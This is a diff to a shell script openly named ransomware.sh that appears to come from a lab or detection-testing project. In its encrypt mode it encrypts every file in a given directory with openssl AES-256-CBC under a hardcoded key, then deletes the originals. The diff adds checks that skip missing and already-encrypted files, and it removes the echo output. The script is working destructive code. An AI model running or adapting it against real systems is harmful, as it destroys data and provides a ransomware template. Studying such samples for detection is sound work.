@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 # LD_PRELOAD=./logger.so ./ransomware.sh [-c -e -d] {directory} {num_files}
 # ex.: LD_PRELOAD=./logger.so ./ransomware.sh -c ./test 10
 
@@ -11,6 +11,18 @@ elif [ $1 = "-e" ]
 then
     for file in ${2}/*;
     do
+        # check if file exists
+        if [ ! -f ${file} ]
+        then
+            continue
+        fi
+
+        # file is already encrypted, check next one
+        if [[ $file == *.encrypt ]]
+        then
+            continue
+        fi
+
         # check if requested num of files have been encrypted
         if [ $i -eq $3 ]
         then
@@ -18,15 +30,9 @@ then
         else
             i=$((i+1))
         fi
-        # check if file exists
-        if [ ! -f ${file} ]
-        then
-            continue
-        fi
         
         openssl aes-256-cbc -e -a -iter 1000 -in ${file} -out ${file}.encrypt -k 1234 # encrypt
-        rm ${file} # and delete unencrypted files
-        echo "${file}"
+        rm ${file} # and delete non-encrypted file
     done
 elif [ $1 = "-d" ]  
 then
@@ -46,6 +52,5 @@ then
         fi
         openssl aes-256-cbc -d -a -iter 1000 -in $file -out ${file%.encrypt} -k 1234 # decrypt
         rm ${file} # and delete encrypted files
-        echo "${file}"
     done
 fi
